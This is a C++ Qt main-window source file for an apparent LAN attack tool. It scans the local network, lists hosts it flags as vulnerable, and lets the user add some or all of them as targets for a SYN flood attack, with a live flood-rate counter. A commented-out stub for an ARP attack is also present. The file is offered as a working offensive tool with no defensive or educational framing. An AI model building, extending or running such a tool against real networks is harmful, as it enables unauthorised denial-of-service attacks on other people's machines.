#include "mainwindow.h"
#include "ui_mainwindow.h"

#include "LANAttacker/lanpcap.h"
#include "LANAttacker/synfloodattacker.h"
#include "LANAttacker/arpattacker.h"
#include <QLabel>
#include <QDebug>
#include <QTimer>
#include <QGraphicsDropShadowEffect>
#include <QMouseEvent>

MainWindow::MainWindow(QWidget *parent) :
    QMainWindow(parent),
    ui(new Ui::MainWindow)
{
    ui->setupUi(this);
    this->FlatWindowUI();

    ui->ScanprogressBar->hide();



    aLANPcap=new LANPcap(this);

    ui->InterfaceBox->addItems(aLANPcap->GetInterfaceDescriptionLists());


    QObject::connect(aLANPcap,&LANPcap::OnUpdateHostInfo,this,&MainWindow::AddIpAddrToList);

    //when succeed send packet, increment the send pack num
    QObject::connect(aLANPcap,&LANPcap::OnSendTcpSynPacket,
    [this](bool Val){
        if(Val)
        {
            this->SendPacketNum++;
        }

    }
    );

    //update the flood speed label every sec
    QTimer *Timer=new QTimer(this);
    QObject::connect(Timer,&QTimer::timeout,

    [this]()
    {
        QString PacketSendSpeed;
        float FloodSpeed=this->SendPacketNum*58/1024.f;
        if(FloodSpeed>1000)
        {
             PacketSendSpeed.sprintf("%.2fmb/s",this->SendPacketNum*58/1024.f/1024.f);
        }else
        {
             PacketSendSpeed.sprintf("%.1fkb/s",this->SendPacketNum*58/1024.f);
        }


        this->SendPacketNum=0;
        ui->FloodSpeedLbl->setText(PacketSendSpeed);
    }
    );
    Timer->start(1000);

    aSynAtker=new SynFloodAttacker(aLANPcap,aLANPcap);

    ui->IpAddrListWidget->setAutoScroll(false);





}

MainWindow::~MainWindow()
{
    delete aSynAtker;
    delete aLANPcap;
    delete ui;
}

void MainWindow::mouseMoveEvent(QMouseEvent *event)
{
    if(!MousePos.isNull())
    {
         QPoint Delta = event->globalPos() - MousePos;
         move(WindowPos+Delta);
    }
}

void MainWindow::mousePressEvent(QMouseEvent *event)
{

    MousePos=event->globalPos();
    WindowPos=pos();

    if(!ui->DragLbl->underMouse())
    {
        //if not in the drag lbl,disable the move function
        MousePos=QPoint();
    }





}

void MainWindow::mouseReleaseEvent(QMouseEvent *event)
{
    MousePos=QPoint();
}





void MainWindow::on_StopAtkBtn_clicked()
{
   this->aSynAtker->StopAttackTargets();

}

void MainWindow::on_StartAtkBtn_clicked()
{


   //---------Func Test for arp attack for future development---------------------------
   // ArpAttacker* aArpAttack=new ArpAttacker(this,aLANPcap);
   // aArpAttack->StartAttack();
   //------------------------------------


  this->aSynAtker->StartAttackTargets();
  this->SendPacketNum=0;
}

void MainWindow::on_AddTargetBtn_clicked()
{
    QString text=ui->IpAddrListWidget->currentItem()->text();
    if(!text.endsWith("|MARK_VIP"))
    {
        ui->IpAddrListWidget->currentItem()->setText(text+"|MARK_VIP");
        aSynAtker->AddTarget(text);
    }

}

void MainWindow::on_RemoveTargetBtn_clicked()
{
    QString text=ui->IpAddrListWidget->currentItem()->text();
    if(text.endsWith("|MARK_VIP"))
    {
         ui->IpAddrListWidget->currentItem()->setText(text.split("|")[0]);
         aSynAtker->RemoveTarget(text);
    }
}

void MainWindow::on_ScanLANBtn_clicked()
{
    if(aLANPcap)
    {
        this->SendPacketNum=0;
        aLANPcap->SetCurrentNetInterface(ui->InterfaceBox->currentIndex());
        ui->ScanprogressBar->setValue(0);

        ui->IpAddrListWidget->clear();
        aSynAtker->ClearTargets();

        ui->IpAddrListWidget->setEnabled(false);
        ui->ScanprogressBar->show();

        aLANPcap->StartAnalyzeLAN();
        ui->ScanLANBtn->hide();
    }
}

void MainWindow::AddIpAddrToList(int HostIndex)
{
    AddHostToIpAddrList(HostIndex);

    if(255!=HostIndex)
    {
        ui->ScanprogressBar->setValue(HostIndex*100/255);

    }
    else
    {
        ui->ScanprogressBar->setValue(100);
        ui->ScanprogressBar->hide();
        ui->ScanLANBtn->show();
        ui->IpAddrListWidget->setEnabled(true);
    }
}

void MainWindow::AddHostToIpAddrList(int HostIndex)
{
    if(aLANPcap)
    {
        const LANHostInfo& HostInfo=aLANPcap->GetHostInfo(HostIndex);

        //only add vulnerable host
        if(HostInfo.bIsHostVulerable)
        {
            QListWidgetItem *Item=new QListWidgetItem(ui->IpAddrListWidget);
            Item->setText(HostInfo.GetIpv4Addr());
            Item->setIcon(QIcon(":/T_HostIco.png"));

            ui->IpAddrListWidget->addItem(Item);

        }

    }
}

void MainWindow::FlatWindowUI()
{
    this->setWindowFlags(Qt::FramelessWindowHint);
    this->setAttribute(Qt::WA_TranslucentBackground);
    QGraphicsDropShadowEffect *ShadowEffect = new QGraphicsDropShadowEffect(this);

    const float ShadowSize=5;

    ShadowEffect->setBlurRadius(ShadowSize);
    ShadowEffect->setOffset(0);
    ShadowEffect->setColor(QColor(255,127,0));
    this->setContentsMargins(ShadowSize,ShadowSize,ShadowSize,ShadowSize);
    this->setGraphicsEffect(ShadowEffect);
}

void MainWindow::on_AddAllTargetBtn_clicked()
{

    if(0==ui->IpAddrListWidget->count())return;
    for(int Index=0;Index<ui->IpAddrListWidget->count();++Index)
    {

        QString text=ui->IpAddrListWidget->item(Index)->text();
        if(!text.endsWith("|MARK_VIP"))
        {
            ui->IpAddrListWidget->item(Index)->setText(text+"|MARK_VIP");
            aSynAtker->AddTarget(text);
        }
    }

}

void MainWindow::on_CloseBtn_clicked()
{
    this->close();
}

void MainWindow::on_MinimizeBtn_clicked()
{
    this->showMinimized();
}
